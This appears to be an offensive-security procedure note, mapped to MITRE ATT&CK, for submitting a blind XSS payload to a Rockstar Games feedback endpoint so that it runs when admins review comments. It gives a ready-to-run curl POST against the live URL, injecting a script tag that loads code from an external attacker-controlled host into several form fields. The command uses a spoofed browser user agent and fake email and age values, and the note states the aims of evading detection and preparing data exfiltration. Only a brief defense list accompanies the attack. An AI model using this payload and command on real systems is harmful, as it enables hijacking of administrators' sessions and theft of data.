---
tags:
  - xss-injection
  - payload-submit
  - blind-xss
type: procedure
tactics:
  - '[[Execution]]'
commands:
  - '[[commands/curl-submit-xss-payload]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2024-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[JavaScript]]'
updated_at: '2025-12-14T00:11:09.780Z'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
id: c3a004e6-9e20-442e-b399-efd3d771a1c0
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[JavaScript]]'
---
# Submit-Malicious-XSS-Payload-via-POST

## Summary

This procedure crafts and submits a POST request to the Rockstar Games feedback endpoint with a Blind XSS payload injected into multiple form fields, storing the malicious script for execution during admin review.

## Description

The vulnerability stems from insufficient input sanitization in the /mouthoff/mouthoff/submit.json endpoint. Attackers inject payloads like '"/><script src=https://abhartiya.xss.ht></script>' into name, subject, and body parameters. The form uses application/x-www-form-urlencoded encoding, with additional fields like email, age, and category_id to mimic legitimate submissions. Upon submission, the payload is stored and rendered unsanitized in the internal admin panel, executing JavaScript when admins view comments for approval.

## Requirements

1. curl or similar HTTP client
2. Control over an external domain for the callback script (e.g., xss.ht)
3. Knowledge of the target endpoint and parameters

## Defense

Defensive measures and detection strategies:

- Sanitize and escape all user inputs (e.g., using HTML entity encoding)
- Validate payload lengths and patterns with server-side checks
- Monitor for external script loads in admin logs

## Objectives

1. Successfully store XSS payload without immediate detection
2. Ensure payload survives to admin review stage
3. Prepare for data exfiltration upon trigger

## Instructions

### Step 1: Craft the Payload

**Context**: Design a payload that breaks out of HTML attributes and loads an external script.

Use the payload: '"/><script src=https://abhartiya.xss.ht></script> (bypasses common filters by closing quotes and tags).

### Step 2: Execute POST Submission

**Context**: Send the request mimicking a browser to avoid basic blocks.

**Command** ([[commands/curl-submit-xss-payload]]):
```bash
curl -X POST https://www.rockstargames.com/mouthoff/mouthoff/submit.json \
  -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "name=\"/><script src=https://abhartiya.xss.ht></script>&subject=\"/><script src=https://abhartiya.xss.ht></script>&body=\"/><script src=https://abhartiya.xss.ht></script>&email=test@gmail.com&age=30&category_id=1"
```

> This command submits the payload across fields, with fake email/age to pass validation. Expected output: HTTP 200 OK, no error message.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[Exploit Public-Facing Application]]
- [[JavaScript]]

### Sub-Techniques


## Commands Used

- [[commands/curl-submit-xss-payload]]

## Tools Used


## Tags

- xss-injection
- payload-submit
